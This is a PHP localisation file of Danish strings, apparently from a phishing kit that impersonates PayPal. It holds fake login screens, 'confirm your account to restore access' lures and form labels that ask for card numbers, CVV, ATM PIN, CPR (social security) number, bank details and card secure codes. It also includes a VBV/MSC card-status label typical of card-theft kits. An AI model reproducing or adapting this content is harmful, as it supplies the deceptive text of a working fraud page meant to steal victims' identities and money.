<?php  

$confirmbutton = "bekræfte";
$confirmyourinfo = "Du er nødt til at bekræfte dine informationer for at kunne løse dette problem, og få adgang til din konto";
$unabletoload = "Midlertidigt ikke indlæse din konto.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Alle rettigheder forbeholdt.";
$wrong = "Nogle oplysninger du indtastede er ikke rigtigt.";
$titlerr = "fejl : logon";
$confirm = "Bekræft din konto Brug den som du vil";
$topp = "Din sikkerhed er vores højeste prioritet";
$secondarycred = "Sekundær Kreditkort (valgfrit)";
$primarycred = "Primære kreditkort";
$thiscardis = "Dette kort er VBV / MSC";


$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$top_title = "Betal, overfør og tag imod penge på nettet – PayPal ".ucfirst($_SESSION['country_name']);
$small_with_helper_input_0 = "Du skal angive en gyldig e-mailadresse";
$small_with_helper_input_1 = "Du skal angive en adgangskode";
$login_email_input_0 = "E-mailadresse";
$passwordRecovery1_a_0 = "Nulstil adgangskoden";
$login_password_input_0 = "Adgangskode";
$passwordRecovery2_a_0 = "Glemt adgangskoden?";
$login_button_a_0 = "Log på";
$signup_button_a_0 = "Opret konto";
$header_buy_a_0 = "Køb";
$header_sell_a_0 = "Sælg";
$header_send_a_0 = "Overfør";
$header_business_a_0 = "Erhverv";
$signup_button_inner_a_0 = "Opret konto";
$hero_h1_0 = "Tryg og nem betaling.";
$SignUp_consumer_hero_input_0 = "Opret en konto gratis";
$signup_subline_p_0 = "Er du virksomhedsejer? Opret en erhvervskonto";
$icon_help_a_0 = "Hjælp";
$icon_contact_a_0 = "Kontakt os";
$_large_h2_n1_0 = "Hurtigt og nemt.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Det er nemt at tage imod kort.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Overfør penge til hvem som helst.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Anmod om en hurtig skilling.";
$contentPara_p_n1_0 = "Millioner af kunder verden over bruger PayPal af én simpel årsag: Det er enkelt. Du skal blot indtaste din e-mailadresse og adgangskode for at bekræfte betalinger. Det er langt hurtigere end at finde din pung frem! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Du kan hurtigt og nemt overføre penge til andre, hvis du blot har deres e-mailadresse. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Det er nemt at anmode om penge, som nogen skylder dig. Den anden person modtager en venlig invitation til at betale dig. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Begynd at tage imod kortbetalinger hurtigt og nemt. Vi har klaret det hele, så du kan komme i gang allerede i dag. Nemmere bliver det ikke. ";
$contentLink_a_n1_0 = "Betaling i webbutikker";
$contentLink_a_n1_1 = "";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Overfør penge";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Anmod om penge";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Tag imod betalinger på dit websted";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Send en digital faktura";
$closingHeadline_headline_large_p_0 = "Tryg og nem betaling. ";
$btn_closing_cta_center_block_span4_a_0 = "Opret en konto gratis";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Kontakt os";
$footer_footer_main_secondaryLink_li[1] = "Gebyrer";
$footer_footer_main_secondaryLink_li[2] = "Sikkerhed";
$footer_footer_main_secondaryLink_li[3] = "Funktioner";
$footer_footer_main_secondaryLink_li[4] = "Butikker";
$footer_footer_main_secondaryLink_li[5] = "PayPal-appen";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Om PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Job";
$footer_footer_secondary_secondaryLink_li[2] = "DBA";
$footer_footer_secondary_secondaryLink_li[3] = "Udviklere";
$footer_footer_secondary_secondaryLink_li[4] = "Partnere";
$footer_footer_secondary_secondaryLink_li[5] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999-".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Persondata";
$footer_footer_tertiary_secondaryLink_li[2] = "Brugeraftale";

$top_title2 = "Fejl – Log på Danmark - PayPal";
$alert_alert_warning_div_0 = "Du skal indtaste både din e-mailadresse og adgangskode. Prøv igen.";
$loginheadline_p_0 = "Log på din konto";
$error_span_0 = "E-mailadresse";
$error_span_1 = "Adgangskode";
$btn_large_input_0 = "Log på";
$pwrLinkoldflow_a_0 = "Har du glemt din e-mailadresse eller din adgangskode?";
$btn_btn_secondary_large_a_0 = "Opret en konto gratis";
$headline_p_0 = "Tryg og nem betaling.<SPAN class=headline-content>Betal med saldo eller tilknyttet kort. Uanset hvad, skal du kun indtaste din e-mailadresse og adgangskode, når du betaler. </SPAN>";
$headline_p_1 = "Gratis, når du betaler i danske kroner.<SPAN class=headline-content>Det er gratis at oprette en PayPal-konto, og du betaler ikke noget gebyr, når du betaler i danske kroner, uanset hvordan du vælger at betale.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Om os";
$footer_li_footer_li[1] = "Kontakt os";
$footer_li_footer_li[2] = "Gebyrer";
$footer_li_footer_li[3] = "Globalt";
$footer_li_footer_li[4] = "Sitefeedback";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Alle rettigheder forbeholdes.";

$charset = "UTF-8";
$profupdate = "Profil opdatering - PayPal";
$processing = "Logger du sikkert";
$opay = "Journaliserer i - PayPal";
$ifno = "Hvis denne side vises i mere end 5 sekunder,";
$clickhere = "Klik her";
$reload = "for at genindlæse.";
$logout = "Log ud";
$help = "Hjælp";
$s_center = "Sikkerhed og beskyttelse";
$myacc = "Min konto";
$over = "Overblik";
$addfound = "Tilføj midler";
$retirar = "Trække";
$banktf = "Overførsel til bankkonto";
$history = "Historie";
$bsearch = "Grundlæggende Søg";
$dhistory = "Hent historie";
$resolu = "Opløsning Centre";
$opencase = "Se åbne sager";
$guides = "Guides";
$prof = "Profil";
$addemail = "Tilføj eller Rediger Email";
$addbank = "Tilføj eller Rediger Bank konto";
$addcard = "Tilføj eller Rediger kreditkort";
$addadr = "Tilføj eller Rediger adresse";
$sendmoney = "Send Money";
$reqmoney = "Anmod om penge";
$mservices = "Merchant serviceydelser";
$autools = "Auktion værktøjer";
$stra = "Sikker transaktion";
$puf = "Profil opdatering";
$pip = "Personlige oplysninger profil";
$acu = "Indtast dine oplysninger så præcist som muligt.";
$accu = "skal du sørge indtaste oplysninger præcist, og i overensstemmelse med formaterne, der kræves.";
$filla = "Udfyld alle de påkrævede felter.";
$rfield = "Påkrævet felt";
$ffPrenom = "fornavn";
$ffNom = "Efternavn";
$dateness = "fødselsdag";
$month = "Måned";
$day = "Dag";
$year = "År";
$adr1 = "adresse linje 1";
$adr2 = "adresse linje 2";
$city = "by";
$state = "tilstand";
$zip = "postnummer";
$country = "land";
$scountry = "--Vælg land--";
$hpn = "hjem telefonnummer";
$acpnum = "dette nummer bruges til at kontakte dig om sikkerhedsforanstaltninger og/eller andre spørgsmål vedrørende din PayPal-konto.";
$ccprof = "Kredit/Debit kort profil";
$damelacc = "Indtast kortoplysninger så nøjagtigt som muligt.";
$damelacb = "Angiv numre for kortnummer, kun please, ingen bindestreger eller mellemrum.";
$Nomdutitulairedelacarte = "navn på kortindehaver";
$ccnumbr = "Kreditkortnummer";
$expbr = "udløbsdato";
$cvv = "kortnummer verifikation";
$hcvv = "Hjælp til at finde dit kortnummer kontrol";
$atmm = "din ATM PIN";
$ssn = "CPR-nummer";
$routing = "Bank registreringsnummer";
$account = "bankkontonummer";
$hrouting = "Hjælp til at finde din Bank registreringsnummer";
$haccount = "Hjælp til at finde dit bankkontonummer";
$codepersonel = "sikre kode";
$IDTYPE = "Vælg type-Id";
$Passport = "Passet";
$Card_Identification = "Kort af identifikation";
$Driving_License = "Kørekort";
$for1 = "For din beskyttelse, vi bekræfte kreditkortoplysningerne.";
$for2 = "oparbejde normalt tager ca. 30 sekunder, men det kan tage længere tid på visse tidspunkter af dagen. Klik venligst på ";
$for3 = "for at opdatere dine oplysninger.";
$spo = "Gem profil";
$t1 = "Yderligere oplysninger";
$t2 = "om os";
$t3 = "Websted Feedback";
$t4 = "Gebyrer";
$t5 = "Privacy";
$t6 = "Security Center";
$t7 = "Kontakt os";
$t8 = "Juridiske aftaler";
$t9 = "Hele verden";
$t10 = "Job";
$t11 = "Merchant serviceydelser";
$t12 = "Vores Blog";
$t13 = "Labs";
$t14 = "Henvisninger";
$t15 = "Oversigt";
$t16 = "eBay";
$t17 = "Fællesskab";
$fdic = "Oplysninger om FDIC pass-through-forsikring";
$myvar3 = "Udfyld formularen nedenfor for at opdatere dine profiloplysninger og gendanne din kontoadgang.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array(
"Indtast venligst dit fornavn"
, "Ugyldigt Fornavn"
, "Indtast venligst dit efternavn"
, "Ugyldigt efternavn"
, "Vælg venligst en gyldig fødsel måned. "
, "Vælg venligst en gyldig fødselsdag. "
, "Vælg venligst en gyldig fødselsår. "
, "Indtast venligst din adresse"
, "Ugyldig adresse"
, "Ugyldig adresse"
, "Skal du indtaste navnet på din by"
, "Angiv venligst et gyldigt navn til byen. "
, "Angiv venligst et gyldigt navn til byen. "
, "Vælg land/område"
, "Indtast venligst dit postnummer"
, "Ugyldigt postnummer. "
, "Indtast venligst dit telefonnummer"
, "Angiv kun tal"
, "Indtast venligst et gyldigt telefonnummer"
, "Indtast venligst et gyldigt navn på kortindehaver"
, "Kortnummeret er ugyldigt format"
, "Kreditkortnummer er ugyldigt"
,""
,""
, "Angiv kun tal"
, "Vælg venligst udløbsdato - måned--"
, "Vælg venligst udløbsdato--år--"
, "Indtast venligst dit Cvv"
, "Indtast venligst en gyldig Cvv/Cvv2 for dit kort. "
, "Ugyldig Cvv/Cvv2"
, "Indtast venligst din ATM PIN"
, "Indtast venligst en gyldig ATM PIN"
, "Indtast venligst en gyldig ATM PIN"
, "Indtast venligst dit CPR-nummer"
, "Ugyldige CPR-nummer. "
, "Ugyldige CPR-nummer. "
, "Social Security Number kun tal"
, "Indtast venligst din Secure Code"
,"Ugyldig sikker kode");
$allcountry1 = "Hej, hvor kommer du fra?";
$allcountry2 = "Vi er tilgængelige i 193 lande og håndterer 26 forskellige valutaer. Betal, overfør og tag imod penge med ro i sindet på tværs af grænser og sprog. Vi er der for dig, uanset hvor du er. ";
$One_moment = "Et øjeblik...";


$your_money = "Få mere ud af dine penge";
$your_money_p = "Din PayPal-konto giver dig en sikrere, hurtigere og mere bekvem måde at betale online og på din mobil. Opbevar dine økonomiske oplysninger sikkert med os derefter bruge din konto til at shoppe, overføre penge eller sælge dine ting at gøre nogle ekstra penge - alt sammen i blot et par klik.";
$websites = "Shop på millioner af websteder";
$websites_p = "PayPal er tilgængelig på millioner af hjemmesider over hele verden. Så uanset om du køber fra de største detailhandlere eller de mindste specialister, kan du shoppe uden at dele dine detaljer og hastighed gennem kassen. Og uanset hvilken enhed du bruger, vil din PayPal-oplevelse være lige så hurtig og bekvem.";
$Simply_secure = "simpelthen sikker";
$Simply_secure_p = "Sikkerhed er kernen i alt, hvad vi gør. Uanset om det er at beskytte dine finansielle detaljer eller dine indkøb, vi sætter din sikkerhed og fred i sindet først. Det er derfor, vi bruger førende kryptering og anti-bedrageri teknologi, hvorfor vi overvåger transaktioner 24 timer i døgnet, og hvorfor vi kan hjælpe dig med at få dine penge tilbage, hvis dit køb ikke er kommet frem eller ikke passer sin beskrivelse.";
$ex_date_info = "Giv os din kortets udløbsdato (MM/ÅÅÅÅ).";
$ex_date_empty = "Giv os din kortets udløbsdato.";
$ex_date_format = "Angiv en gyldig udløbsdato (MM/ÅÅÅÅ).";
$cardholder_info = "Brug dit navn som vist på dit kort";
$card_info = "Indtast dit kortnummer";
$card_format = "Kortnummer er ugyldigt";
$atm_info = "Indtast ATM pin for dette kort.";
$account_info = "Indtast dit kontonummer";
$account_empty = "Indtast venligst dit kontonummer til at bekræfte din konto";
$account_format = "Angiv en gyldig bankkontonummer";
$routing_info = "Indtast din bank routing nummer";
$routing_empty = "Indtast venligst din bank routing nummer at bekræfte din konto";
$routing_format = "Angiv en gyldig bank routing nummer";
$first_name = "Dit fornavn";
$first_name_info = "Brug din juridiske fornavn som vist på dit kørekort, National Insurance eller pas.";
$first_name_empty = "Vi har brug for din juridiske fornavn at bekræfte din konto.";
$last_name = "Dit efternavn";
$last_name_info = "Brug din juridiske efternavn som vist på dit kørekort, National Insurance eller pas.";
$last_name_empty = "Vi har brug for din juridiske efternavn at bekræfte din konto.";
$Birth_date = "Fødselsdato";
$Birth_date_empty ="Giv os din fødselsdato.";
$Birth_date_format = "Angiv en gyldig dato (DD/MM/ÅÅÅÅ).";
$Birth_date_info = "Giv os din fødselsdato (DD/MM/ÅÅÅÅ).";
$Address1 = "Adresse linje 1";
$Address1_empty = "Vi har brug for en gyldig adresse for at bekræfte din konto.";
$Address1_info = "Vi kan ikke acceptere postbokse eller business-adresser.";
$Address2 = "Adresse linje 2";
$City = "by";
$City_empty = "Vi har brug for en by for at bekræfte din konto.";
$Postcode = "Postnummer";
$Postcode_empty = "Vi har brug for et postnummer for at oprette en ny konto til dig.";
$Postcode_format = "Tjek venligst dit postnummer for slåfejl, er formatet ikke se ret.";
$fone = "Dit telefonnummer";
$fone_empty = "Vi har brug for dit telefonnummer til at bekræfte din konto.";
$fone_format = "Tjek venligst dit telefonnummer for slåfejl, er formatet ikke se ret.";
$fone_info = "Dit telefonnummer (benyt venligst cifre kun)";
$verifyaccount = "Bekræft din konto";
$Ownb = "Ejer en virksomhed?";
$hh1 = "Din sikre detaljer";
$hh2 = "Dine personlige oplysninger";
$pp1 = "Vi har brug for din gyldige sikre oplysninger for at bekræfte din konto.";
$pp2 = "Vi har brug for nogle oplysninger om dig, før vi kan bekræfte din konto.";

$type1="Hjem";
$type2="Mobil";
$button_continue="Fortsæt";
$button_validate="Bekræft";
?>